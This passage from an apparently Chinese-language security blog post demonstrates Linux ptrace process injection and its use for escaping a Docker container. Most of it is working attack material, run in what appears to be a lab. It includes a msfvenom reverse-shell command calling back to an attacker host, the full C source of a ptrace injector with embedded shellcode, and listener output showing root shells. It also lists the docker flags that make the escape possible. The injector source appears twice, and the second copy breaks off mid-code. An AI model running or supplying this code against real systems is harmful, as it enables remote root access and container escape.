+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 123</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击机启动监听：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+
+<p><strong>注入进程：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  ps -ef | grep 123 | grep -v grep</span><br><span class="line">root       1694   1299  0 12:08 pts/1    00:00:00 python3 -m http.server 123</span><br><span class="line">➜  ./linux-inject/inject -p 1694 ./poc.so</span><br><span class="line">targeting process with pid 1694</span><br><span class="line">ptrace(PTRACE_GETSIGINFO) failed</span><br></pre></td></tr></table></figure>
+
+<p><strong>结果：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@vuln:~<span class="comment"># exit</span></span><br><span class="line">NCAT DEBUG: Closing fd 5.</span><br><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:39410.</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br></pre></td></tr></table></figure>
+
+<p><strong>再次查看进程：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  ps -ef | grep bash</span><br><span class="line">root       1694   1299  0 12:08 pts/1    00:00:00 /bin/bash</span><br><span class="line">root       1785    978  0 12:10 pts/0    00:00:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox bash</span><br><span class="line">➜  ps -ef | grep python</span><br><span class="line">root        435      1  0 11:27 ?        00:00:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal</span><br><span class="line">root       1547   1299  0 12:04 pts/1    00:00:00 python3 -m http.server 3333</span><br><span class="line">root       1800    978  0 12:10 pts/0    00:00:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox python</span><br></pre></td></tr></table></figure>
+
+<p><strong>通过网络连接查看：</strong></p>
+<p>通过网络连接可以发现</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  netstat -pantu</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">......</span><br><span class="line">tcp        0      0 172.16.42.151:39410     172.16.42.100:4444      ESTABLISHED 1694/bas</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-通过shellcode注入进程"><a href="#2-通过shellcode注入进程" class="headerlink" title="2. 通过shellcode注入进程"></a>2. 通过shellcode注入进程</h2><p>攻击机器：172.16.42.100</p>
+<p>靶机：172.16.42.151</p>
+<p>获取poc：<a target="_blank" rel="noopener" href="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c">https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</a></p>
+<p>生成shellcode(如果不生成，会在靶机上生成一个终端):</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp <span class="attribute">LHOST</span>=172.16.42.100 <span class="attribute">LPORT</span>=4444 -f c</span><br></pre></td></tr></table></figure>
+
+<p>替换shellcode(==注意长度#define SHELLCODE_SIZE 74，等于shellcode的大小，一定要设置为相应大小的值==）:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Mem Inject</span></span><br><span class="line"><span class="comment">  Copyright (c) 2016 picoFlamingo</span></span><br><span class="line"><span class="comment">This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment">the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="comment">(at your option) any later version.</span></span><br><span class="line"><span class="comment">This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment">along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHELLCODE_SIZE 74</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *shellcode = </span><br><span class="line"><span class="string">&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xb9\x02\x00\x11\x5c\xac\x10\x2a\x64\x51\x48\x89\xe6\x6a\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">inject_data</span> <span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">unsigned</span> <span class="keyword">char</span> *src, <span class="keyword">void</span> *dst, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span>      i;</span><br><span class="line">  <span class="keyword">uint32_t</span> *s = (<span class="keyword">uint32_t</span> *) src;</span><br><span class="line">  <span class="keyword">uint32_t</span> *d = (<span class="keyword">uint32_t</span> *) dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i+=<span class="number">4</span>, s++, d++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(POKETEXT):&quot;</span>);</span><br><span class="line">	  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pid_t</span>                   target;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">  <span class="keyword">int</span>                     syscall;</span><br><span class="line">  <span class="keyword">long</span>                    dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span> (<span class="built_in">stderr</span>, <span class="string">&quot;Usage:\n\t%s pid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  target = atoi (argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Tracing process %d\n&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_ATTACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(ATTACH):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Waiting for process...\n&quot;</span>);</span><br><span class="line">  wait (<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Getting Registers\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_GETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Inject code into current RPI position */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Injecting shell code at %p\n&quot;</span>, (<span class="keyword">void</span>*)regs.rip);</span><br><span class="line">  inject_data (target, shellcode, (<span class="keyword">void</span>*)regs.rip, SHELLCODE_SIZE);</span><br><span class="line"></span><br><span class="line">  regs.rip += <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Setting instruction pointer to %p\n&quot;</span>, (<span class="keyword">void</span>*)regs.rip);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_SETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Run it!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_DETACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(DETACH):&quot;</span>);</span><br><span class="line">	  <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>编译代码:</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc infect.<span class="keyword">c</span> -o infectx</span><br></pre></td></tr></table></figure>
+
+<p>攻击机监听</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">4444</span></span><br></pre></td></tr></table></figure>
+
+<p>靶机宿主机启动一个python server进程</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> -m http.server <span class="number">124</span></span><br></pre></td></tr></table></figure>
+
+<p>注入</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ps -ef | grep 124 | grep -v grep</span><br><span class="line">root       2239   2216  0 09:43 pts/1    00:00:00 python3 -m http.server 124</span><br><span class="line">➜  ./infectx 2239</span><br><span class="line">+ Tracing process 2239</span><br><span class="line">+ Waiting <span class="keyword">for</span> process...</span><br><span class="line">+ Getting Registers</span><br><span class="line">+ Injecting shell code at 0x7f222adc87e4</span><br><span class="line">+ Setting instruction pointer to 0x7f222adc87e6</span><br><span class="line">+ Run it!</span><br></pre></td></tr></table></figure>
+
+<p> 结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:39412.</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="3-利用shellcode进程注入进行容器逃逸"><a href="#3-利用shellcode进程注入进行容器逃逸" class="headerlink" title="3. 利用shellcode进程注入进行容器逃逸"></a>3. 利用shellcode进程注入进行容器逃逸</h2><p>攻击机器：172.16.42.100</p>
+<p>靶机：172.16.42.151</p>
+<p>带有SYS_PTRACE权限的容器还是挺多的，对于开发来说可能需要SYS_PTRACE权限进行调试</p>
+<p>靶机启动带宿主机进程和CAP_SYS_PTRACE特权的容器</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="builtin-name">run</span> --name test -itd <span class="attribute">--cap-add</span>=SYS_PTRACE <span class="attribute">--pid</span>=host --security-opt <span class="attribute">apparmor</span>=unconfined --rm ubuntu</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用成功前提：</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">--cap-add</span>=SYS_PTRACE</span><br><span class="line"><span class="attribute">--pid</span>=host</span><br><span class="line">--security-opt <span class="attribute">apparmor</span>=unconfined</span><br></pre></td></tr></table></figure>
+
+
+
+<p>获取poc：<a target="_blank" rel="noopener" href="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c">https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</a></p>
+<p>生成shellcode(如果不生成，会在靶机上生成一个终端):</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp <span class="attribute">LHOST</span>=172.16.42.100 <span class="attribute">LPORT</span>=4444 -f c</span><br></pre></td></tr></table></figure>
+
+<p>替换shellcode(==注意长度#define SHELLCODE_SIZE 74，等于shellcode的大小，一定要设置为相应大小的值==）:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Mem Inject</span></span><br><span class="line"><span class="comment">  Copyright (c) 2016 picoFlamingo</span></span><br><span class="line"><span class="comment">This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment">the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="comment">(at your option) any later version.</span></span><br><span class="line"><span class="comment">This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment">along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHELLCODE_SIZE 74</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *shellcode = </span><br><span class="line"><span class="string">&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xb9\x02\x00\x11\x5c\xac\x10\x2a\x64\x51\x48\x89\xe6\x6a\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">inject_data</span> <span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">unsigned</span> <span class="keyword">char</span> *src, <span class="keyword">void</span> *dst, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span>      i;</span><br><span class="line">  <span class="keyword">uint32_t</span> *s = (<span class="keyword">uint32_t</span> *) src;</span><br><span class="line">  <span class="keyword">uint32_t</span> *d = (<span class="keyword">uint32_t</span> *) dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i+=<span class="number">4</span>, s++, d++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(POKETEXT):&quot;</span>);</span><br><span class="line">	  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pid_t</span>                   target;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">  <span class="keyword">int</span>                     syscall;</span><br><span class="line">  <span class="keyword">long</span>                    dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span> (<span class="built_in">stderr</span>, <span class="string">&quot;Usage:\n\t%s pid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  target = atoi (argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Tracing process %d\n&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_ATTACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(ATTACH):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Waiting for process...\n&quot;</span>);</span><br><span class="line">  wait (<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Getting Registers\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_GETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Inject code into current RPI position */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Injecting shell code at %p\n&quot;</span>, (<span 